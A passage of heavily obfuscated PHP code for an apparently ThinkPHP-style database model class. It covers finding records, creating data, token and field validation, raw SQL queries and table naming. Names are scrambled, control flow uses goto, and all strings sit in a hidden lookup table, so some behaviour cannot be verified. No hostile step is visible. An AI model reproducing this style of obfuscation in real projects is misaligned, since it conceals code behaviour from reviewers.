$dÍçÊÈÒËš[$b¬¶¨åèİ[283]]; } $dÍçÊÈÒËš[$b¬¶¨åèİ[284]] = $this->name; goto Eî»šá°êï; Eî»šá°êï: if (isset($dÍçÊÈÒËš[$b¬¶¨åèİ[278]]) && is_array($dÍçÊÈÒËš[$b¬¶¨åèİ[278]]) && !empty($dííœãœ´–) && !isset($dÍçÊÈÒËš[$b¬¶¨åèİ[285]]) && !isset($dÍçÊÈÒËš[$b¬¶¨åèİ[282]])) { foreach ($dÍçÊÈÒËš[$b¬¶¨åèİ[278]] as $bŞìñêµ‡ => $F²®ÍœØöà) { $bŞìñêµ‡ = trim($bŞìñêµ‡); if (in_array($bŞìñêµ‡, $dííœãœ´–, !0)) { if (is_scalar($F²®ÍœØöà)) { $this->_parseType($dÍçÊÈÒËš[$b¬¶¨åèİ[278]], $bŞìñêµ‡); } } elseif (!is_numeric($bŞìñêµ‡) && $b¬¶¨åèİ[80] != substr($bŞìñêµ‡, 0, 1) && !1 === strpos($bŞìñêµ‡, $b¬¶¨åèİ[101]) && !1 === strpos($bŞìñêµ‡, $b¬¶¨åèİ[263]) && !1 === strpos($bŞìñêµ‡, $b¬¶¨åèİ[286]) && !1 === strpos($bŞìñêµ‡, $b¬¶¨åèİ[287])) { unset($dÍçÊÈÒËš[$b¬¶¨åèİ[278]][$bŞìñêµ‡]); } } } $this->_options_filter($dÍçÊÈÒËš); return $dÍçÊÈÒËš; goto bÒƒ—òŸßÑ; bÒƒ—òŸßÑ: } protected function _options_filter(&$dìÔ‚×Š¿) { } protected function _parseType(&$DèßšÉ“õ», $Cï•İ£Úß„) { $dÀØê›Æˆø =& $_SERVER[¢Í]; if (empty($this->options[$dÀØê›Æˆø[288]][$dÀØê›Æˆø[4] . $Cï•İ£Úß„])) { $eƒåÚÑì— = strtolower($this->fields[$dÀØê›Æˆø[255]][$Cï•İ£Úß„]); if (!1 !== strpos($eƒåÚÑì—, $dÀØê›Æˆø[289])) { } elseif (!1 === strpos($eƒåÚÑì—, $dÀØê›Æˆø[290]) && !1 !== strpos($eƒåÚÑì—, $dÀØê›Æˆø[291])) { $DèßšÉ“õ»[$Cï•İ£Úß„] = intval($DèßšÉ“õ»[$Cï•İ£Úß„]); } elseif (!1 !== strpos($eƒåÚÑì—, $dÀØê›Æˆø[292]) || !1 !== strpos($eƒåÚÑì—, $dÀØê›Æˆø[293])) { $DèßšÉ“õ»[$Cï•İ£Úß„] = floatval($DèßšÉ“õ»[$Cï•İ£Úß„]); } elseif (!1 !== strpos($eƒåÚÑì—, $dÀØê›Æˆø[294])) { $DèßšÉ“õ»[$Cï•İ£Úß„] = (bool) $DèßšÉ“õ»[$Cï•İ£Úß„]; } } } public function find($B—‹º‡æòå = array()) { goto a¤ÔãóçÂ­; C¬Û¹ÈçÓ: if (!empty($this->options[$E¾¼¸Å×è[296]])) { return $this->returnResult($this->data, $this->options[$E¾¼¸Å×è[296]]); } return $this->data; goto DÉœ¥¼îæ; a¤ÔãóçÂ­: $E¾¼¸Å×è =& $_SERVER[¢Í]; if (is_numeric($B—‹º‡æòå) || is_string($B—‹º‡æòå)) { $BŠÏ®…‘’§[$this->getPk()] = intval($B—‹º‡æòå); $this->options[$E¾¼¸Å×è[278]] = $BŠÏ®…‘’§; } $this->options[$E¾¼¸Å×è[295]] = 1; goto bÛòæÓò¹à; bÛòæÓò¹à: $B—‹º‡æòå = $this->_parseOptions(); $cêó×‘İ“µ = $this->db->select($B—‹º‡æòå); if (!1 === $cêó×‘İ“µ) { return !1; } goto f‚Öõ Ÿš; f‚Öõ Ÿš: if (empty($cêó×‘İ“µ)) { return null; } $this->data = $cêó×‘İ“µ[0]; $this->_afterFind($this->data, $B—‹º‡æòå); goto C¬Û¹ÈçÓ; DÉœ¥¼îæ: } protected function _afterFind(&$fóÏŒ­ÙÉ, $e•ìÁÎÊä) { } protected function returnResult($cÌ¯¬Â¿ˆƒ, $aÏŠ©´•Ö¤ = '') { $e«Ü„¶ =& $_SERVER[¢Í]; if ($aÏŠ©´•Ö¤) { if (is_callable($aÏŠ©´•Ö¤)) { return call_user_func($aÏŠ©´•Ö¤, $cÌ¯¬Â¿ˆƒ); } switch (strtolower($aÏŠ©´•Ö¤)) { case $e«Ü„¶[297]: return json_encode($cÌ¯¬Â¿ˆƒ); case $e«Ü„¶[298]: return xml_encode($cÌ¯¬Â¿ˆƒ); } } return $cÌ¯¬Â¿ˆƒ; } public function parseFieldsMap($d¾ÑÔ§ˆ…è, $c²Îğ³›ª˜ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $f´ˆ…›È®† => $C¶æ‚ÊêºÀ) { if ($c²Îğ³›ª˜ == 1) { if (isset($d¾ÑÔ§ˆ…è[$C¶æ‚ÊêºÀ])) { $d¾ÑÔ§ˆ…è[$f´ˆ…›È®†] = $d¾ÑÔ§ˆ…è[$C¶æ‚ÊêºÀ]; unset($d¾ÑÔ§ˆ…è[$C¶æ‚ÊêºÀ]); } } else { if (isset($d¾ÑÔ§ˆ…è[$f´ˆ…›È®†])) { $d¾ÑÔ§ˆ…è[$C¶æ‚ÊêºÀ] = $d¾ÑÔ§ˆ…è[$f´ˆ…›È®†]; unset($d¾ÑÔ§ˆ…è[$f´ˆ…›È®†]); } } } } return $d¾ÑÔ§ˆ…è; } public function setField($Dà»ŒÔçÈä, $FÜ´ˆˆâé± = '') { if (is_array($Dà»ŒÔçÈä)) { $FÂÛ‚¬Šæ‰ = $Dà»ŒÔçÈä; } else { $FÂÛ‚¬Šæ‰[$Dà»ŒÔçÈä] = $FÜ´ˆˆâé±; } return $this->save($FÂÛ‚¬Šæ‰); } public function setAdd($dùé¼ Š¯, $Bº³„²Âà‘ = 1) { $D‘ÕÕÜ¬¯‹ =& $_SERVER[¢Í]; $CÉ¥”‡§Äİ = $dùé¼ Š¯ . $D‘ÕÕÜ¬¯‹[299] . $Bº³„²Âà‘; if ($Bº³„²Âà‘ < 0) { $CÉ¥”‡§Äİ = $dùé¼ Š¯ . $Bº³„²Âà‘; } return $this->setField($dùé¼ Š¯, array($D‘ÕÕÜ¬¯‹[300], $CÉ¥”‡§Äİ)); } public function getField($C•„¦ŸÄ•·, $f‘Àâ‡µ· = null) { $E©ÚñÏ‚©ø =& $_SERVER[¢Í]; $Dº¹Âòøá[$E©ÚñÏ‚©ø[276]] = $C•„¦ŸÄ•·; $Dº¹Âòøá = $this->_parseOptions($Dº¹Âòøá); $C•„¦ŸÄ•· = trim($C•„¦ŸÄ•·); if (strpos($C•„¦ŸÄ•·, $E©ÚñÏ‚©ø[47])) { if (!isset($Dº¹Âòøá[$E©ÚñÏ‚©ø[295]])) { $Dº¹Âòøá[$E©ÚñÏ‚©ø[295]] = is_numeric($f‘Àâ‡µ·) ? $f‘Àâ‡µ· : $E©ÚñÏ‚©ø[33]; } $eÎ°‡Âëä = $this->db->select($Dº¹Âòøá); if (!empty($eÎ°‡Âëä)) { goto Fõ…®õ™´; DÒÍæ¥ô¤Ô: foreach ($eÎ°‡Âëä as $fâø—·«Œ‹) { $EœŸÆ„¼âá = $fâø—·«Œ‹[$Bù£±¹†Çø]; if (2 == $eÛ’ß¾Õ¶) { $f¥ëò³Ü¼¹[$EœŸÆ„¼âá] = $fâø—·«Œ‹[$fÎïäŒ‡Óç]; } else { $f¥ëò³Ü¼¹[$EœŸÆ„¼âá] = is_string($f‘Àâ‡µ·) ? implode($f‘Àâ‡µ·, $fâø—·«Œ‹) : $fâø—·«Œ‹; } } return $f¥ëò³Ü¼¹; goto bá‚Àœ¶ù§; F¯â‡³£ô¯: $fÎïäŒ‡Óç = array_shift($C•„¦ŸÄ•·); $f¥ëò³Ü¼¹ = array(); $eÛ’ß¾Õ¶ = count($A…èÍ«Öµ); goto DÒÍæ¥ô¤Ô; Fõ…®õ™´: $A…èÍ«Öµ = explode($E©ÚñÏ‚©ø[47], $C•„¦ŸÄ•·); $C•„¦ŸÄ•· = array_keys($eÎ°‡Âëä[0]); $Bù£±¹†Çø = array_shift($C•„¦ŸÄ•·); goto F¯â‡³£ô¯; bá‚Àœ¶ù§: } } else { if (!0 !== $f‘Àâ‡µ·) { $Dº¹Âòøá[$E©ÚñÏ‚©ø[295]] = is_numeric($f‘Àâ‡µ·) ? $f‘Àâ‡µ· : 1; } if ($f‘Àâ‡µ· === $E©ÚñÏ‚©ø[258]) { unset($Dº¹Âòøá[$E©ÚñÏ‚©ø[295]]); } $fâø—·«Œ‹ = $this->db->select($Dº¹Âòøá); if (!empty($fâø—·«Œ‹)) { if ($f‘Àâ‡µ· === $E©ÚñÏ‚©ø[258]) { return reset($fâø—·«Œ‹[0]); } if (!0 !== $f‘Àâ‡µ· && 1 == $Dº¹Âòøá[$E©ÚñÏ‚©ø[295]]) { return reset($fâø—·«Œ‹[0]); } foreach ($fâø—·«Œ‹ as $CÕ¹«Ë¤ôã) { $e›ÜğÖŞŠÙ[] = $CÕ¹«Ë¤ôã[$C•„¦ŸÄ•·]; } return $e›ÜğÖŞŠÙ; } } return null; } public function create($BÏ¤õÀ¹¹Ï = '', $fÇÄÔ¨µ¢Ï = '') { goto AóÈ‘ÚÓ·ó; bŠ¾æÔíõÈ: if ($this->autoCheckFields) { $FšÃ†àë•ê = $this->getDbFields(); foreach ($BÏ¤õÀ¹¹Ï as $c–¡»ïÌô‚ => $DÉÈßÃš’Û) { if (!in_array($c–¡»ïÌô‚, $FšÃ†àë•ê)) { unset($BÏ¤õÀ¹¹Ï[$c–¡»ïÌô‚]); } elseif (MAGIC_QUOTES_GPC && is_string($DÉÈßÃš’Û)) { $BÏ¤õÀ¹¹Ï[$c–¡»ïÌô‚] = stripslashes($DÉÈßÃš’Û); } } } $this->autoOperation($BÏ¤õÀ¹¹Ï, $fÇÄÔ¨µ¢Ï); $this->data = $BÏ¤õÀ¹¹Ï; goto dÃ×¹Ğ¼‚ğ; c¼ĞÔØæ¢¹: if (isset($FšÃ†àë•ê)) { if (is_string($FšÃ†àë•ê)) { $FšÃ†àë•ê = explode($e«›ğ˜¥®”[47], $FšÃ†àë•ê); } if (think_config($e«›ğ˜¥®”[301])) { $FšÃ†àë•ê[] = think_config($e«›ğ˜¥®”[302]); } foreach ($BÏ¤õÀ¹¹Ï as $c–¡»ïÌô‚ => $DÉÈßÃš’Û) { if (!in_array($c–¡»ïÌô‚, $FšÃ†àë•ê)) { unset($BÏ¤õÀ¹¹Ï[$c–¡»ïÌô‚]); } } } if (!$this->autoValidation($BÏ¤õÀ¹¹Ï, $fÇÄÔ¨µ¢Ï)) { return !1; } if (!$this->autoCheckToken($BÏ¤õÀ¹¹Ï)) { $this->error = think_lang($e«›ğ˜¥®”[303]); return !1; } goto bŠ¾æÔíõÈ; f÷È„¨”ÅŒ: $BÏ¤õÀ¹¹Ï = $this->parseFieldsMap($BÏ¤õÀ¹¹Ï, 0); $fÇÄÔ¨µ¢Ï = $fÇÄÔ¨µ¢Ï ? $fÇÄÔ¨µ¢Ï : (!empty($BÏ¤õÀ¹¹Ï[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$e«›ğ˜¥®”[276]])) { $FšÃ†àë•ê = $this->options[$e«›ğ˜¥®”[276]]; unset($this->options[$e«›ğ˜¥®”[276]]); } elseif ($fÇÄÔ¨µ¢Ï == THINK_MODEL_INSERT && isset($this->insertFields)) { $FšÃ†àë•ê = $this->insertFields; } elseif ($fÇÄÔ¨µ¢Ï == THINK_MODEL_UPDATE && isset($this->updateFields)) { $FšÃ†àë•ê = $this->updateFields; } goto c¼ĞÔØæ¢¹; dÃ×¹Ğ¼‚ğ: return $BÏ¤õÀ¹¹Ï; goto eË†î£ê”Ó; AóÈ‘ÚÓ·ó: $e«›ğ˜¥®” =& $_SERVER[¢Í]; if (empty($BÏ¤õÀ¹¹Ï)) { $BÏ¤õÀ¹¹Ï = $_POST; } elseif (is_object($BÏ¤õÀ¹¹Ï)) { $BÏ¤õÀ¹¹Ï = get_object_vars($BÏ¤õÀ¹¹Ï); } if (empty($BÏ¤õÀ¹¹Ï) || !is_array($BÏ¤õÀ¹¹Ï)) { $this->error = think_lang($e«›ğ˜¥®”[274]); return !1; } goto f÷È„¨”ÅŒ; eË†î£ê”Ó: } public function autoCheckToken($cÑàŞ†ŠÃ) { $eÔ‹¹’íºÇ =& $_SERVER[¢Í]; if (isset($this->options[$eÔ‹¹’íºÇ[304]]) && !$this->options[$eÔ‹¹’íºÇ[304]]) { return !0; } if (think_config($eÔ‹¹’íºÇ[301])) { $F¼„‡øß©ï = think_config($eÔ‹¹’íºÇ[302]); if (!isset($cÑàŞ†ŠÃ[$F¼„‡øß©ï]) || Session::get($F¼„‡øß©ï)) { return !1; } list($AÕŸä»³Ï˜, $eŸŠ²ïõÌĞ) = explode($eÔ‹¹’íºÇ[80], $cÑàŞ†ŠÃ[$F¼„‡øß©ï]); if ($eŸŠ²ïõÌĞ && Session::get($F¼„‡øß©ï . $eÔ‹¹’íºÇ[101] . $AÕŸä»³Ï˜) === $eŸŠ²ïõÌĞ) { Session::remove($F¼„‡øß©ï . $eÔ‹¹’íºÇ[101] . $AÕŸä»³Ï˜); return !0; } if (think_config($eÔ‹¹’íºÇ[305])) { Session::remove($F¼„‡øß©ï . $eÔ‹¹’íºÇ[101] . $AÕŸä»³Ï˜); } return !1; } return !0; } public function regex($fõ›òÍÕñÈ, $b‰òï¹šï») { $cÃÇÃ–×“æ =& $_SERVER[¢Í]; $DÀÆËàÒâ = array($cÃÇÃ–×“æ[306] => $cÃÇÃ–×“æ[307], $cÃÇÃ–×“æ[308] => $cÃÇÃ–×“æ[309], $cÃÇÃ–×“æ[310] => $cÃÇÃ–×“æ[311], $cÃÇÃ–×“æ[312] => $cÃÇÃ–×“æ[313], $cÃÇÃ–×“æ[314] => $cÃÇÃ–×“æ[315], $cÃÇÃ–×“æ[316] => $cÃÇÃ–×“æ[317], $cÃÇÃ–×“æ[318] => $cÃÇÃ–×“æ[319], $cÃÇÃ–×“æ[293] => $cÃÇÃ–×“æ[320], $cÃÇÃ–×“æ[321] => $cÃÇÃ–×“æ[322]); if (isset($DÀÆËàÒâ[strtolower($b‰òï¹šï»)])) { $b‰òï¹šï» = $DÀÆËàÒâ[strtolower($b‰òï¹šï»)]; } return preg_match($b‰òï¹šï», $fõ›òÍÕñÈ) === 1; } private function autoOperation(&$d‘½¬öÑÀ…, $däİ®İİ‚Ú) { $bŠ‹×º¶Ê° =& $_SERVER[¢Í]; if (!empty($this->options[$bŠ‹×º¶Ê°[323]])) { $C„—ç¿áé‡ = $this->options[$bŠ‹×º¶Ê°[323]]; unset($this->options[$bŠ‹×º¶Ê°[323]]); } elseif (!empty($this->_auto)) { $C„—ç¿áé‡ = $this->_auto; } if (isset($C„—ç¿áé‡)) { foreach ($C„—ç¿áé‡ as $E¦ªŒäÉ) { if (empty($E¦ªŒäÉ[2])) { $E¦ªŒäÉ[2] = THINK_MODEL_INSERT; } if ($däİ®İİ‚Ú == $E¦ªŒäÉ[2] || $E¦ªŒäÉ[2] == THINK_MODEL_BOTH) { switch (trim($E¦ªŒäÉ[3])) { case $bŠ‹×º¶Ê°[324]: case $bŠ‹×º¶Ê°[325]: $eğˆê¹ä® = isset($E¦ªŒäÉ[4]) ? (array) $E¦ªŒäÉ[4] : array(); if (isset($d‘½¬öÑÀ…[$E¦ªŒäÉ[0]])) { array_unshift($eğˆê¹ä®, $d‘½¬öÑÀ…[$E¦ªŒäÉ[0]]); } if ($bŠ‹×º¶Ê°[324] == $E¦ªŒäÉ[3]) { $d‘½¬öÑÀ…[$E¦ªŒäÉ[0]] = call_user_func_array($E¦ªŒäÉ[1], $eğˆê¹ä®); } else { $d‘½¬öÑÀ…[$E¦ªŒäÉ[0]] = call_user_func_array(array(&$this, $E¦ªŒäÉ[1]), $eğˆê¹ä®); } break; case $bŠ‹×º¶Ê°[276]: $d‘½¬öÑÀ…[$E¦ªŒäÉ[0]] = $d‘½¬öÑÀ…[$E¦ªŒäÉ[1]]; break; case $bŠ‹×º¶Ê°[326]: if ($bŠ‹×º¶Ê°[33] === $d‘½¬öÑÀ…[$E¦ªŒäÉ[0]]) { unset($d‘½¬öÑÀ…[$E¦ªŒäÉ[0]]); } break; case $bŠ‹×º¶Ê°[327]: default: $d‘½¬öÑÀ…[$E¦ªŒäÉ[0]] = $E¦ªŒäÉ[1]; } if (!1 === $d‘½¬öÑÀ…[$E¦ªŒäÉ[0]]) { unset($d‘½¬öÑÀ…[$E¦ªŒäÉ[0]]); } } } } return $d‘½¬öÑÀ…; } protected function autoValidation($F³ì«Éõéª, $fáöê¬¬³) { $dî›©³¡÷ø =& $_SERVER[¢Í]; if (!empty($this->options[$dî›©³¡÷ø[328]])) { $B×ïï‰È‰Õ = $this->options[$dî›©³¡÷ø[328]]; unset($this->options[$dî›©³¡÷ø[328]]); } elseif (!empty($this->_validate)) { $B×ïï‰È‰Õ = $this->_validate; } if (isset($B×ïï‰È‰Õ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($B×ïï‰È‰Õ as $e¢¢ŠØ›„Õ => $bŞ”Êˆì‹Ò) { if (empty($bŞ”Êˆì‹Ò[5]) || $bŞ”Êˆì‹Ò[5] == THINK_MODEL_BOTH || $bŞ”Êˆì‹Ò[5] == $fáöê¬¬³) { if (0 == strpos($bŞ”Êˆì‹Ò[2], $dî›©³¡÷ø[329]) && strpos($bŞ”Êˆì‹Ò[2], $dî›©³¡÷ø[330])) { $bŞ”Êˆì‹Ò[2] = think_lang(substr($bŞ”Êˆì‹Ò[2], 2, -1)); } $bŞ”Êˆì‹Ò[3] = isset($bŞ”Êˆì‹Ò[3]) ? $bŞ”Êˆì‹Ò[3] : THINK_EXISTS_VALIDATE; $bŞ”Êˆì‹Ò[4] = isset($bŞ”Êˆì‹Ò[4]) ? $bŞ”Êˆì‹Ò[4] : $dî›©³¡÷ø[331]; switch ($bŞ”Êˆì‹Ò[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($F³ì«Éõéª, $bŞ”Êˆì‹Ò)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($dî›©³¡÷ø[33] != trim($F³ì«Éõéª[$bŞ”Êˆì‹Ò[0]])) { if (!1 === $this->_validationField($F³ì«Éõéª, $bŞ”Êˆì‹Ò)) { return !1; } } break; default: if (isset($F³ì«Éõéª[$bŞ”Êˆì‹Ò[0]])) { if (!1 === $this->_validationField($F³ì«Éõéª, $bŞ”Êˆì‹Ò)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($CáİèÕÁ¸, $EÒÈì÷”¶) { if (!1 === $this->_validationFieldItem($CáİèÕÁ¸, $EÒÈì÷”¶)) { if ($this->patchValidate) { $this->error[$EÒÈì÷”¶[0]] = $EÒÈì÷”¶[2]; } else { $this->error = $EÒÈì÷”¶[2]; return !1; } } return; } protected function _validationFieldItem($bÉ¡ ßß, $F²à÷Ñø¶„) { $E »†­ïË =& $_SERVER[¢Í]; switch (strtolower(trim($F²à÷Ñø¶„[4]))) { case $E »†­ïË[324]: case $E »†­ïË[325]: $F‡ŞšˆƒÏë = isset($F²à÷Ñø¶„[6]) ? (array) $F²à÷Ñø¶„[6] : array(); if (is_string($F²à÷Ñø¶„[0]) && strpos($F²à÷Ñø¶„[0], $E »†­ïË[47])) { $F²à÷Ñø¶„[0] = explode($E »†­ïË[47], $F²à÷Ñø¶„[0]); } if (is_array($F²à÷Ñø¶„[0])) { foreach ($F²à÷Ñø¶„[0] as $D¡Úµƒ†ŠÅ) { $CÌº‡çó[$D¡Úµƒ†ŠÅ] = $bÉ¡ ßß[$D¡Úµƒ†ŠÅ]; } array_unshift($F‡ŞšˆƒÏë, $CÌº‡çó); } else { array_unshift($F‡ŞšˆƒÏë, $bÉ¡ ßß[$F²à÷Ñø¶„[0]]); } if ($E »†­ïË[324] == $F²à÷Ñø¶„[4]) { return call_user_func_array($F²à÷Ñø¶„[1], $F‡ŞšˆƒÏë); } else { return call_user_func_array(array(&$this, $F²à÷Ñø¶„[1]), $F‡ŞšˆƒÏë); } case $E »†­ïË[332]: return $bÉ¡ ßß[$F²à÷Ñø¶„[0]] == $bÉ¡ ßß[$F²à÷Ñø¶„[1]]; case $E »†­ïË[333]: if (is_string($F²à÷Ñø¶„[0]) && strpos($F²à÷Ñø¶„[0], $E »†­ïË[47])) { $F²à÷Ñø¶„[0] = explode($E »†­ïË[47], $F²à÷Ñø¶„[0]); } $aî…Ï¢¼ = array(); if (is_array($F²à÷Ñø¶„[0])) { foreach ($F²à÷Ñø¶„[0] as $D¡Úµƒ†ŠÅ) { $aî…Ï¢¼[$D¡Úµƒ†ŠÅ] = $bÉ¡ ßß[$D¡Úµƒ†ŠÅ]; } } else { $aî…Ï¢¼[$F²à÷Ñø¶„[0]] = $bÉ¡ ßß[$F²à÷Ñø¶„[0]]; } if (!empty($bÉ¡ ßß[$this->getPk()])) { $aî…Ï¢¼[$this->getPk()] = array($E »†­ïË[334], $bÉ¡ ßß[$this->getPk()]); } if ($this->where($aî…Ï¢¼)->find()) { return !1; } return !0; default: return $this->check($bÉ¡ ßß[$F²à÷Ñø¶„[0]], $F²à÷Ñø¶„[1], $F²à÷Ñø¶„[4]); } } public function check($BŒÈÒÑ£‚”, $d¬´Ääçñº, $cöÊ¢²Ûô‚ = "\x72\x65\x67\145\x78") { $BÒ©–¥§½ê =& $_SERVER[¢Í]; $cöÊ¢²Ûô‚ = strtolower(trim($cöÊ¢²Ûô‚)); switch ($cöÊ¢²Ûô‚) { case $BÒ©–¥§½ê[7]: case $BÒ©–¥§½ê[335]: $E³ß³İ†­’ = is_array($d¬´Ääçñº) ? $d¬´Ääçñº : explode($BÒ©–¥§½ê[47], $d¬´Ääçñº); return $cöÊ¢²Ûô‚ == $BÒ©–¥§½ê[7] ? in_array($BŒÈÒÑ£‚”, $E³ß³İ†­’) : !in_array($BŒÈÒÑ£‚”, $E³ß³İ†­’); case $BÒ©–¥§½ê[336]: case $BÒ©–¥§½ê[337]: if (is_array($d¬´Ääçñº)) { $EÈÅÜëàÈ = $d¬´Ääçñº[0]; $a¿ç×Ìšê = $d¬´Ääçñº[1]; } else { list($EÈÅÜëàÈ, $a¿ç×Ìšê) = explode($BÒ©–¥§½ê[47], $d¬´Ääçñº); } return $cöÊ¢²Ûô‚ == $BÒ©–¥§½ê[336] ? $BŒÈÒÑ£‚” >= $EÈÅÜëàÈ && $BŒÈÒÑ£‚” <= $a¿ç×Ìšê : $BŒÈÒÑ£‚” < $EÈÅÜëàÈ || $BŒÈÒÑ£‚” > $a¿ç×Ìšê; case $BÒ©–¥§½ê[338]: case $BÒ©–¥§½ê[339]: return $cöÊ¢²Ûô‚ == $BÒ©–¥§½ê[338] ? $BŒÈÒÑ£‚” == $d¬´Ääçñº : $BŒÈÒÑ£‚” != $d¬´Ääçñº; case $BÒ©–¥§½ê[340]: $Fª–ùãİì = mb_strlen($BŒÈÒÑ£‚”, $BÒ©–¥§½ê[341]); if (strpos($d¬´Ääçñº, $BÒ©–¥§½ê[47])) { list($EÈÅÜëàÈ, $a¿ç×Ìšê) = explode($BÒ©–¥§½ê[47], $d¬´Ääçñº); return $Fª–ùãİì >= $EÈÅÜëàÈ && $Fª–ùãİì <= $a¿ç×Ìšê; } else { return $Fª–ùãİì == $d¬´Ääçñº; } case $BÒ©–¥§½ê[342]: list($E¿æÏê“Š, $e‘ç­š‘ˆ) = explode($BÒ©–¥§½ê[47], $d¬´Ääçñº); if (!is_numeric($E¿æÏê“Š)) { $E¿æÏê“Š = strtotime($E¿æÏê“Š); } if (!is_numeric($e‘ç­š‘ˆ)) { $e‘ç­š‘ˆ = strtotime($e‘ç­š‘ˆ); } return NOW_TIME >= $E¿æÏê“Š && NOW_TIME <= $e‘ç­š‘ˆ; case $BÒ©–¥§½ê[343]: return in_array(get_client_ip(), explode($BÒ©–¥§½ê[47], $d¬´Ääçñº)); case $BÒ©–¥§½ê[344]: return !in_array(get_client_ip(), explode($BÒ©–¥§½ê[47], $d¬´Ääçñº)); case $BÒ©–¥§½ê[331]: default: return $this->regex($BŒÈÒÑ£‚”, $d¬´Ääçñº); } } public function query($cÛ³Ó¦È°¯, $C¢‘Ã›Á‰ = false) { $F‹åŠòŒãñ =& $_SERVER[¢Í]; if (!is_bool($C¢‘Ã›Á‰) && !is_array($C¢‘Ã›Á‰)) { $C¢‘Ã›Á‰ = func_get_args(); array_shift($C¢‘Ã›Á‰); } $cÛ³Ó¦È°¯ = str_replace(array($F‹åŠòŒãñ[56], $F‹åŠòŒãñ[345]), $F‹åŠòŒãñ[50], $cÛ³Ó¦È°¯); $cÛ³Ó¦È°¯ = $this->parseSql($cÛ³Ó¦È°¯, $C¢‘Ã›Á‰); return $this->db->query($cÛ³Ó¦È°¯); } public function execute($CµšÈì›Õ±, $fËèÎ¨Ç = false) { if (!is_bool($fËèÎ¨Ç) && !is_array($fËèÎ¨Ç)) { $fËèÎ¨Ç = func_get_args(); array_shift($fËèÎ¨Ç); } $CµšÈì›Õ± = $this->parseSql($CµšÈì›Õ±, $fËèÎ¨Ç); return $this->db->execute($CµšÈì›Õ±); } protected function parseSql($C‹ÍÒœœÚ´, $fªç±ïè³Û) { $dµ»—ÌÖÕ” =& $_SERVER[¢Í]; if (!0 === $fªç±ïè³Û) { $bã‹İæ İÁ = $this->_parseOptions(); $C‹ÍÒœœÚ´ = $this->db->parseSql($C‹ÍÒœœÚ´, $bã‹İæ İÁ); } elseif (is_array($fªç±ïè³Û)) { $fªç±ïè³Û = array_map(array($this->db, $dµ»—ÌÖÕ”[346]), $fªç±ïè³Û); $C‹ÍÒœœÚ´ = vsprintf($C‹ÍÒœœÚ´, $fªç±ïè³Û); } else { $C‹ÍÒœœÚ´ = strtr($C‹ÍÒœœÚ´, array($dµ»—ÌÖÕ”[347] => $this->getTableName(), $dµ»—ÌÖÕ”[348] => think_config($dµ»—ÌÖÕ”[247]))); } $this->db->setModel($this->name); return $C‹ÍÒœœÚ´; } public function db($eø¶İ¢ã¶ = '', $b†¤óÜè = '', $d»ç²ÊÄ½¯ = array()) { goto AÏ••Ë¶‹İ; AÏ••Ë¶‹İ: $E´È¨ğŸ¶ =& $_SERVER[¢Í]; if ($E´È¨ğŸ¶[33] === $eø¶İ¢ã¶ && $this->db) { return $this->db; } static $f™Ñµì•¨Ñ = array(); goto Eíó„Æ×è; dùÓª†À¯: $f™Ñµì•¨Ñ[$eø¶İ¢ã¶] = $b†¤óÜè; $this->db = $Aâƒ²‹ÓÖë[$eø¶İ¢ã¶]; $this->_after_db(); goto A²‰ìó•; Eíó„Æ×è: static $Aâƒ²‹ÓÖë = array(); if (!isset($Aâƒ²‹ÓÖë[$eø¶İ¢ã¶]) || isset($Aâƒ²‹ÓÖë[$eø¶İ¢ã¶]) && $b†¤óÜè && $f™Ñµì•¨Ñ[$eø¶İ¢ã¶] != $b†¤óÜè) { if (!empty($b†¤óÜè) && is_string($b†¤óÜè) && !1 === strpos($b†¤óÜè, $E´È¨ğŸ¶[8])) { $b†¤óÜè = think_config($b†¤óÜè); } $Aâƒ²‹ÓÖë[$eø¶İ¢ã¶] = Db::getInstance($b†¤óÜè); } elseif (NULL === $b†¤óÜè) { $Aâƒ²‹ÓÖë[$eø¶İ¢ã¶]->close(); unset($Aâƒ²‹ÓÖë[$eø¶İ¢ã¶]); return; } if (!empty($d»ç²ÊÄ½¯)) { if (is_string($d»ç²ÊÄ½¯)) { parse_str($d»ç²ÊÄ½¯, $d»ç²ÊÄ½¯); } foreach ($d»ç²ÊÄ½¯ as $d©¸¦æãÇ´ => $B”ê·‚óÎ´) { $this->setProperty($d©¸¦æãÇ´, $B”ê·‚óÎ´); } } goto dùÓª†À¯; A²‰ìó•: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto c¨¡¿™†ÌÚ; c¨¡¿™†ÌÚ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $eˆ¯ÕËßİÃ = get_class($this); if ($eˆ¯ÕËßİÃ == $_SERVER[¢Í][349]) { return $this->name; } $this->name = substr($eˆ¯ÕËßİÃ, 0, -5); } return $this->name; } public function getTableName() { $FõÃ½¯…‚ï =& $_SERVER[¢Í]; if (empty($this->trueTableName)) { $b±³ç·ñŞ¯ = !empty($this->tablePrefix) ? $this->tablePrefix : $FõÃ½¯…‚ï[33]; if (!empty($this->tableName)) { $b±³ç·ñŞ¯ .= $this->tableName; } else { $b±³ç·ñŞ¯ .= think_parse_name($this->name); } $this->trueTableName = strtolower($b±³ç·ñŞ¯); } return (!empty($this->dbName) ? $this->dbName . $FõÃ½¯…‚ï[101] : $FõÃ½¯…‚ï[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $aã„š¹²Ê =& $_SERVER[¢Í]; return isset($this->fields[$aã„š¹²Ê[254]]) ? $this->fields[$aã„š¹²Ê[254]] : $this->pk; } public function getDbFields() { $bÚÉÁöÒ±× =& $_SERVER[¢Í]; if (isset($this->options[$bÚÉÁöÒ±×[282]])) { $Fø½ßÇŒ™‹ = $this->db->getFields($this->options[$bÚÉÁöÒ±×[282]]); return $Fø½ßÇŒ™‹ ? array_keys($Fø½ßÇŒ™‹) : !1; } if ($this->fields) { $Fø½ßÇŒ™‹ = $this->fields; unset($Fø½ßÇŒ™‹[$bÚÉÁöÒ±×[253]], 